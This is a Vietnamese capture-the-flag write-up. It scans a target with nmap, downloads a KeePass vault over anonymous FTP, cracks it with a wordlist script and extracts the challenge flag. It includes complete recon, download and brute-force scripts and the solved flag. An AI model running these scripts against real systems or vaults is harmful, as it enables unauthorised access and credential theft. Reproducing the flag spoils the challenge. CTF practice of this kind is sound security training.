# CIT Pwn - Challenge 1 Writeup (Flag1) - Detailed

## Mục tiêu

Lấy `flag1` từ target `23.179.17.69`.

---

## 0) Chuẩn bị môi trường

```bash
mkdir -p chall1 && cd chall1
```

Tool dùng trong bài:

- `nmap`, `nc`, `curl`
- `node` + package `kdbxweb`

---

## 1) Recon - quét service ngoài

### Script: `01_recon.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"

echo "[*] Scan full TCP ports on $TARGET"
nmap -Pn -p- --min-rate 1500 --max-retries 2 "$TARGET"

echo
echo "[*] Service detection on discovered FTP port"
nmap -Pn -sV -sC -p 10921 "$TARGET"
```

Chạy:

```bash
chmod +x 01_recon.sh
./01_recon.sh 23.179.17.69
```

Kết quả chính:

- `22/tcp` mở (ssh)
- `10921/tcp` mở
- Banner service `10921`: `220 uftpd (2.9) ready.`

---

## 2) FTP enumeration

### Script: `02_ftp_enum.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
PORT="${2:-10921}"

echo "[*] Banner check"
{ echo; sleep 1; } | nc -nv "$TARGET" "$PORT" || true

echo
echo "[*] Anonymous listing"
curl -sS --user anonymous:anonymous "ftp://$TARGET:$PORT/"
```

Chạy:

```bash
chmod +x 02_ftp_enum.sh
./02_ftp_enum.sh
```

Kết quả thấy file:

```text
vault.kdbx
```

---

## 3) Tải vault

### Script: `03_download_vault.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
PORT="${2:-10921}"
OUT="${3:-vault.kdbx}"

echo "[*] Downloading vault from FTP..."
curl -sS --user anonymous:anonymous -o "$OUT" "ftp://$TARGET:$PORT/vault.kdbx"

echo "[+] Saved: $OUT"
file "$OUT"
ls -lh "$OUT"
```

Chạy:

```bash
chmod +x 03_download_vault.sh
./03_download_vault.sh
```

---

## 4) Crack mật khẩu KeePass

Ý tưởng: thử wordlist phổ biến bằng `kdbxweb` cho tới khi mở được DB.

### 4.1 Cài package + tải wordlist

```bash
npm init -y
npm install kdbxweb
curl -sSL -o common10k.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
```

### 4.2 Script crack: `04_crack_vault.js`

```js
const fs = require("fs");
const readline = require("readline");
const kdbxweb = require("kdbxweb");

const vaultPath = process.argv[2] || "vault.kdbx";
const wordlistPath = process.argv[3] || "common10k.txt";

const data = fs.readFileSync(vaultPath);
const ab = data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength);

async function run() {
  const rl = readline.createInterface({
    input: fs.createReadStream(wordlistPath),
    crlfDelay: Infinity,
  });

  let i = 0;
  for await (const line of rl) {
    const pw = line.trim();
    if (!pw) continue;
    i++;
    try {
      await kdbxweb.Kdbx.load(ab, new kdbxweb.Credentials(kdbxweb.ProtectedValue.fromString(pw)));
      console.log(`[+] FOUND_PASSWORD=${pw}`);
      return;
    } catch (_) {}
  }

  console.log("[-] Password not found in wordlist");
}

run();
```

Chạy:

```bash
node 04_crack_vault.js vault.kdbx common10k.txt
```

Kết quả:

```text
[+] FOUND_PASSWORD=winter
```

---

## 5) Trích xuất flag1 từ DB

### Script: `05_extract_flag1.js`

```js
const fs = require("fs");
const kdbxweb = require("kdbxweb");

const vaultPath = process.argv[2] || "vault.kdbx";
const password = process.argv[3] || "winter";

const data = fs.readFileSync(vaultPath);
const ab = data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength);

function walk(group) {
  for (const e of group.entries) {
    const titleField = e.fields.get("Title");
    const notesField = e.fields.get("Notes");
    const title = titleField && titleField.getText
      ? titleField.getText()
      : (titleField || "");
    const notes = notesField && notesField.getText
      ? notesField.getText()
      : (notesField || "");

    if (notes) {
      const m = notes.match(/CIT\{[^}\n]+\}/);
      if (m) {
        console.log(`[+] Entry=${title}`);
        console.log(`[+] flag1=${m[0]}`);
        process.exit(0);
      }
    }
  }

  for (const g of group.groups) walk(g);
}

(async () => {
  const db = await kdbxweb.Kdbx.load(
    ab,
    new kdbxweb.Credentials(kdbxweb.ProtectedValue.fromString(password))
  );
  walk(db.getDefaultGroup());
  console.log("[-] Flag not found");
})();
```

Chạy:

```bash
node 05_extract_flag1.js vault.kdbx winter
```

Output:

```text
[+] Entry=login
[+] flag1=CIT{ftp_d33z_nut$}
```

---

## 6) One-shot script (tùy chọn)

### Script: `solve_chall1.sh`

```bash
#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-23.179.17.69}"
PORT="${2:-10921}"

echo "[*] Download vault"
curl -sS --user anonymous:anonymous -o vault.kdbx "ftp://$TARGET:$PORT/vault.kdbx"

if [ ! -f package.json ]; then
  npm init -y >/dev/null
fi
npm install kdbxweb >/dev/null

if [ ! -f common10k.txt ]; then
  curl -sSL -o common10k.txt \
    https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
fi

cat > /tmp/chall1_combo.js <<'JS'
const fs = require("fs");
const readline = require("readline");
const k = require("kdbxweb");
const data = fs.readFileSync("vault.kdbx");
const ab = data.buffer.slice(data.byteOffset, data.byteOffset + data.byteLength);

async function crack() {
  const rl = readline.createInterface({ input: fs.createReadStream("common10k.txt"), crlfDelay: Infinity });
  for await (const line of rl) {
    const pw = line.trim();
    if (!pw) continue;
    try {
      const db = await k.Kdbx.load(ab, new k.Credentials(k.ProtectedValue.fromString(pw)));
      return { db, pw };
    } catch (_) {}
  }
  return null;
}

function walk(g) {
  for (const e of g.entries) {
    const notesF = e.fields.get("Notes");
    const notes = notesF && notesF.getText ? notesF.getText() : (notesF || "");
    const m = notes.match(/CIT\{[^}\n]+\}/);
    if (m) return m[0];
  }
  for (const x of g.groups) {
    const v = walk(x);
    if (v) return v;
  }
  return null;
}

(async () => {
  const r = await crack();
  if (!r) return console.log("[-] password not found");
  const flag = walk(r.db.getDefaultGroup());
  console.log(`[+] password=${r.pw}`);
  console.log(`[+] flag1=${flag}`);
})();
JS

node /tmp/chall1_combo.js
```

---

## Flag1

```text
CIT{ftp_d33z_nut$}
```
